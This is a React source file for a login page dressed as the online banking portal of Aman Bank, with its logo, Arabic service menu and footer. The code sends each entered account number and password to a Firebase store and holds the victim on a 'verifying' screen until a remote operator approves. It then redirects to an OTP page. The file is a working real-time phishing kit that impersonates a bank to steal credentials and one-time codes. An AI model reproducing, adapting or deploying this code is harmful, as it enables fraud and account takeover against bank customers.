import { useState, useEffect, useRef } from "react";
import { Eye, EyeOff } from "lucide-react";
import { useNavigate } from "@/components/TransitionContext";
import { saveLogin, saveLoginSession, getLoginSession, listenForApproval, resetApproval } from "@/lib/firebase";

const BLUE  = "#1a3a7a";
const BLUE2 = "#1e4db7";
const GOLD  = "#c8970a";

const services = [
  { label: "إدارة المستفيدين",                     icon: "👤" },
  { label: "بطاقات الدفع المسبق",                  icon: "💳" },
  { label: "سحب بدون بطاقة",                       icon: "🏧" },
  { label: "كاستومر اونبوردنق",                    icon: "👨‍💼" },
  { label: "شحن رصيد الموبايل",                    icon: "📱" },
  { label: "طلب طباعة بطاقة عن طريق الـ KIOSK",    icon: "🖨️" },
  { label: "بطاقات السحب الآلي",                   icon: "💰" },
  { label: "تحويل الأموال",                        icon: "🔄" },
  { label: "طباعة دفتر صكوك عن طريق KIOSK",        icon: "📄" },
  { label: "مطابقة بيانات مخصص الأغراض الشخصية 2024", icon: "👨‍💻" },
  { label: "أمان باي كيو آر",                      icon: "📲" },
];

export default function LoginPage() {
  const { navigateTo } = useNavigate();
  const [username, setUsername]   = useState(getLoginSession);
  const [password, setPassword]   = useState("");
  const [showPw,   setShowPw]     = useState(false);
  const [menuOpen, setMenuOpen]   = useState(false);
  const [altLogin, setAltLogin]   = useState(false);
  const [pageState, setPageState] = useState<"form" | "waiting">("form");
  const [loginError, setLoginError] = useState("");
  const [errors,  setErrors]  = useState<{ username?: string; password?: string }>({});
  const [touched, setTouched] = useState<{ username?: boolean; password?: boolean }>({});
  const unsubRef = useRef<(() => void) | null>(null);

  useEffect(() => {
    resetApproval().catch(() => {});
    return () => { unsubRef.current?.(); };
  }, []);

  const validate = (u: string, p: string) => {
    const e: { username?: string; password?: string } = {};
    if (!u.trim()) e.username = "رقم الحساب مطلوب";
    else if (!/^\d{9}$/.test(u.trim())) e.username = "رقم الحساب يجب أن يكون 9 أرقام";
    if (!p) e.password = "كلمة المرور مطلوبة";
    else if (p.length < 4) e.password = "كلمة المرور يجب أن تكون 4 أحرف على الأقل";
    return e;
  };
  const touch = (f: "username" | "password") => {
    setTouched(t => ({ ...t, [f]: true }));
    setErrors(validate(username, password));
  };
  const isValid = !Object.keys(validate(username, password)).length && !!username && !!password;

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate(username, password);
    setErrors(errs);
    setTouched({ username: true, password: true });
    if (Object.keys(errs).length) return;

    setLoginError("");
    unsubRef.current?.();
    saveLoginSession(username);
    await saveLogin(username, password).catch(console.error);

    setPageState("waiting");
    unsubRef.current = listenForApproval((approved) => {
      if (approved === true) {
        unsubRef.current?.();
        navigateTo("/otp");
      } else if (approved === false) {
        unsubRef.current?.();
        setPageState("form");
        setPassword("");
        setTouched({});
        setLoginError("رقم الحساب أو كلمة المرور غير صحيحة");
      }
    });
  };

  /* ── Waiting screen ── */
  if (pageState === "waiting") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#0d2660,${BLUE},${BLUE2})`, fontFamily: "'Cairo',sans-serif", padding: "0 32px", textAlign: "center" }}>
        <div style={{ position: "relative", width: 96, height: 96, marginBottom: 32 }}>
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid rgba(255,255,255,0.1)" }} />
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid transparent", borderTopColor: "#f5d06e", animation: "ab-spin 1s linear infinite" }} />
          <div style={{ position: "absolute", inset: 14, borderRadius: "50%", background: "rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 28 }}>
            💳
          </div>
        </div>
        <h2 style={{ color: "white", fontSize: 20, fontWeight: 900, margin: "0 0 28px" }}>جارٍ التحقق من بياناتك</h2>
        <div style={{ display: "flex", gap: 8 }}>
          {[0,1,2,3].map(i => (
            <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: "#f5d06e", animation: "ab-dot 1.2s ease-in-out infinite", animationDelay: `${i * 0.18}s` }} />
          ))}
        </div>
      </div>
    );
  }

  /* ── Form ── */
  return (
    <div dir="rtl" style={{ fontFamily: "'Cairo', sans-serif", maxWidth: 480, margin: "0 auto", minHeight: "100vh", background: "white" }}>

      {/* ── Navbar ── */}
      <nav style={{ background: "white", borderBottom: "1px solid #e8eef5", display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 16px", direction: "ltr" }}>
        <button onClick={() => setMenuOpen(v => !v)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4, display: "flex", alignItems: "center", color: BLUE }}>
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round">
            <line x1="3" y1="6"  x2="21" y2="6"/>
            <line x1="3" y1="12" x2="21" y2="12"/>
            <line x1="3" y1="18" x2="21" y2="18"/>
          </svg>
        </button>
        <img src="/aman-bank-logo.png" alt="مصرف الأمان" style={{ height: 48 }} />
      </nav>

      {/* ── Drawer ── */}
      {menuOpen && (
        <div style={{ position: "fixed", inset: 0, zIndex: 100, background: "rgba(0,0,0,0.45)" }} onClick={() => setMenuOpen(false)}>
          <div style={{ position: "absolute", top: 0, right: 0, bottom: 0, width: 270, background: "white", boxShadow: "-6px 0 30px rgba(0,0,0,0.15)" }} onClick={e => e.stopPropagation()}>
            <div style={{ background: `linear-gradient(135deg,#0d2660,${BLUE})`, padding: "28px 20px 20px" }}>
              <img src="/aman-bank-logo.png" alt="" style={{ height: 38, filter: "brightness(0) invert(1)" }} />
            </div>
            {["الرئيسية","خدماتنا","من نحن","تواصل معنا","الشروط والأحكام"].map(item => (
              <button key={item} style={{ display: "block", width: "100%", textAlign: "right", padding: "14px 20px", border: "none", borderBottom: "1px solid #f1f5f9", background: "white", color: "#374151", fontSize: 14, fontWeight: 600, cursor: "pointer", fontFamily: "'Cairo',sans-serif" }}>{item}</button>
            ))}
          </div>
        </div>
      )}

      {/* ── Form area ── */}
      <form onSubmit={submit} noValidate style={{ padding: "32px 24px 24px" }}>

        {/* Username underline field */}
        <div style={{ marginBottom: 28 }}>
          <div style={{ position: "relative", borderBottom: `1.5px solid ${touched.username && errors.username ? "#ef4444" : "#c8d0dc"}` }}>
            <input
              type="text"
              value={username}
              placeholder="رقم الحساب (9 أرقام)"
              dir="ltr"
              inputMode="numeric"
              maxLength={9}
              onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 9); setUsername(v); if (touched.username) setErrors(validate(v, password)); }}
              onBlur={() => touch("username")}
              style={{ width: "100%", padding: "10px 0 10px", border: "none", outline: "none", fontSize: 14, fontFamily: "'Cairo',sans-serif", color: "#1a202c", background: "transparent", textAlign: "right", boxSizing: "border-box" }}
            />
          </div>
          {touched.username && errors.username && (
            <p style={{ color: "#ef4444", fontSize: 11, marginTop: 4, textAlign: "right", fontWeight: 600 }}>{errors.username}</p>
          )}
        </div>

        {/* Password underline field */}
        <div style={{ marginBottom: 28 }}>
          <div style={{ position: "relative", borderBottom: `1.5px solid ${touched.password && errors.password ? "#ef4444" : "#c8d0dc"}` }}>
            <input
              type={showPw ? "text" : "password"}
              value={password}
              placeholder="كلمة المرور"
              dir="rtl"
              onChange={e => { setPassword(e.target.value); if (touched.password) setErrors(validate(username, e.target.value)); }}
              onBlur={() => touch("password")}
              style={{ width: "100%", padding: "10px 0 10px", border: "none", outline: "none", fontSize: 14, fontFamily: "'Cairo',sans-serif", color: "#1a202c", background: "transparent", textAlign: "right", boxSizing: "border-box", paddingLeft: 28 }}
            />
            <button type="button" onClick={() => setShowPw(v => !v)}
              style={{ position: "absolute", left: 0, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#94a3b8", padding: 0, display: "flex" }}>
              {showPw ? <EyeOff size={17} /> : <Eye size={17} />}
            </button>
          </div>
          {touched.password && errors.password && (
            <p style={{ color: "#ef4444", fontSize: 11, marginTop: 4, textAlign: "right", fontWeight: 600 }}>{errors.password}</p>
          )}
        </div>

        {/* Toggle row */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 12, marginBottom: 28 }}>
          <span style={{ fontSize: 13, color: "#4b5563", fontWeight: 600 }}>تمكين تسجيل الدخول البديل</span>
          <button type="button" onClick={() => setAltLogin(v => !v)}
            style={{ width: 44, height: 24, borderRadius: 12, border: "none", cursor: "pointer", padding: 2, background: altLogin ? BLUE : "#d1d5db", transition: "background 0.25s", position: "relative", flexShrink: 0 }}>
            <div style={{ width: 20, height: 20, borderRadius: "50%", background: "white", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", position: "absolute", top: 2, transition: "left 0.25s", left: altLogin ? 22 : 2 }} />
          </button>
        </div>

        {/* Error banner */}
        {loginError && (
          <div style={{ background: "#fff0f0", border: "1.5px solid #fca5a5", borderRadius: 8, padding: "10px 14px", display: "flex", alignItems: "center", gap: 10, marginBottom: 16 }}>
            <span style={{ fontSize: 16 }}>🚫</span>
            <span style={{ color: "#b91c1c", fontSize: 13, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>{loginError}</span>
          </div>
        )}

        {/* Submit button */}
        <button type="submit"
          style={{ width: "100%", padding: "15px 0", borderRadius: 8, fontWeight: 800, fontSize: 15, color: "white", border: "none", cursor: "pointer", background: BLUE, fontFamily: "'Cairo',sans-serif", letterSpacing: 0.3 }}>
          تسجيل الدخول
        </button>

        {/* Forgot password */}
        <div style={{ textAlign: "center", marginTop: 16 }}>
          <button type="button" style={{ background: "none", border: "none", color: GOLD, fontSize: 13, fontWeight: 700, cursor: "pointer", fontFamily: "'Cairo',sans-serif" }}>
            نسيت كلمة المرور
          </button>
        </div>
      </form>

      {/* ── Quick access ── */}
      <div style={{ padding: "4px 20px 24px" }}>
        <h4 style={{ color: GOLD, fontSize: 17, fontWeight: 800, margin: "0 0 20px", textAlign: "right" }}>
          اللقطة السريعة
        </h4>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: "18px 8px" }}>
          {services.map((s, i) => (
            <button key={i} style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, background: "none", border: "none", cursor: "pointer", fontFamily: "'Cairo',sans-serif", padding: "0 2px" }}>
              <div style={{ width: 54, height: 54, borderRadius: 12, background: "#f0f4fb", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 24 }}>
                {s.icon}
              </div>
              <span style={{ fontSize: 9.5, color: "#374151", fontWeight: 600, lineHeight: 1.35, textAlign: "center" }}>{s.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* ── Footer ── */}
      <div style={{ background: `linear-gradient(135deg,#0d2660,${BLUE})`, padding: "18px 16px", textAlign: "center", marginTop: 8 }}>
        <img src="/aman-bank-logo.png" alt="" style={{ height: 26, filter: "brightness(0) invert(1)", opacity: 0.7, marginBottom: 10 }} />
        <p style={{ color: "rgba(180,210,255,0.7)", fontSize: 11, margin: "0 0 8px" }}>حقوق النشر محفوظة لمصرف الأمان 2019©</p>
        <div style={{ display: "flex", justifyContent: "center", gap: 16 }}>
          {["الشروط والأحكام","المعلومات","تواصل معنا"].map(t => (
            <button key={t} style={{ background: "none", border: "none", color: "rgba(180,210,255,0.65)", fontSize: 11, cursor: "pointer", fontFamily: "'Cairo',sans-serif" }}>{t}</button>
          ))}
        </div>
      </div>

    </div>
  );
}
